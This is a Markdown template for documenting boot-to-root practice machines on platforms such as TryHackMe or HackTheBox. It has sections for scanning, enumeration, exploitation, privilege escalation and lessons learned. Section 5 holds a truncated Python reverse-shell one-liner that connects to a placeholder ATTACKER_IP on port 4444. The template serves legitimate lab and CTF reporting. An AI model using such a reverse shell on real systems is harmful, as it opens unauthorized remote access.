# Boot-to-Root Report Template (Markdown)

> Use this template to document your boot-to-root machines. Copy it into a file named `REPORT.md` or `machine-name.md`.

---

## Metadata

* **Machine Name**:
* **Platform**: (e.g. TryHackMe / HackTheBox / VulnHub / Local VM)
* **IP / Host**:
* **Date**: YYYY-MM-DD
* **Author**: Roban (or your handle)
* **Difficulty Level**: Easy / Medium / Hard
* **Goal**: Boot-to-root / Capture the flag / Practice

---

## 1) Executive Summary

A short paragraph (2–4 lines) explaining how you obtained `user` and `root` and which main vulnerabilities were exploited.

---

## 2) Environment & Tools

* Host OS: (e.g. Kali Linux 2024.3)
* Tools used: (nmap, gobuster, burpsuite, linpeas, smbclient, etc.)

> **Tip:** include versions if relevant.

---

## 3) Initial Reconnaissance (Scanning)

### Commands executed

```bash
nmap -sC -sV -oN nmap_initial.txt <IP>
# or
nmap -p- -T4 -oN nmap_allports.txt <IP>
```

### Ports / Services Summary

| Port | Service | Version     | Notes                    |
| ---- | ------- | ----------- | ------------------------ |
| 22   | ssh     | OpenSSH 7.x | password login disabled? |
| 80   | http    | Apache 2.x  | homepage, /robots.txt    |

---

## 4) Enumeration

Detail each service you explored: purpose, commands, results, and your interpretation.

### HTTP

* **Command**: `gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt`
* **Interesting pages**: `/admin`, `/uploads`, `/robots.txt`
* **Screenshots**: (link or path to `screenshots/`)

### SMB / FTP / Others

* **SMB**: `smbclient -L //<IP>`
* **FTP**: anonymous? `ftp <IP>`

---

## 5) Exploitation (User Access)

Describe step-by-step how you gained a user shell:

* Vulnerability or vector (e.g. file upload, brute-force, injection)
* Exploit used (name, exploit-db link if applicable)
* Key commands and relevant output

```bash
# Example: PHP reverse shell upload
python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("ATTACKER_IP",4444)); ...'
```

---

## 6) Post-Exploitation / Information Gathering

* Sensitive files found (e.g. `/home/user/.ssh/authorized_keys`, `/var/www/html/config.php`)
* Interesting users / groups
* `user.txt` flag location (omit actual flag if public)

---

## 7) Privilege Escalation (Root)

* Methods attempted (linpeas, sudo checks, SUID search, cron jobs)
* Final exploit or method (exact command + explanation)
* Final command to read `root.txt`:

```bash
cat /root/root.txt
```

---

## 8) Final Results / Flags

* `user.txt`: `path/to/user.txt` (or redacted flag)
* `root.txt`: `path/to/root.txt`

---

## 9) Timeline (Optional)

* YYYY-MM-DD HH:MM — Initial scan
* YYYY-MM-DD HH:MM — Found /uploads
* YYYY-MM-DD HH:MM — Got reverse shell

---

## 10) Lessons Learned & Notes

* What you would do differently
* Tools or techniques worth studying further
* Mistakes or pitfalls encountered

---

## 11) Evidence / Artifacts

* `screenshots/` — Screens or proof
* `pcaps/` — Network captures (if any)
* `exploits/` — Custom or modified scripts

> Add a minimal README per machine to explain reproduction steps if relevant.

---

## 12) References

* Links to CVEs, exploit-db, writeups, documentation used.

---

## Appendix (useful snippets)

Include here raw outputs (`nmap`, `sudo -l`, logs, etc.) while keeping sensitive info private.

---

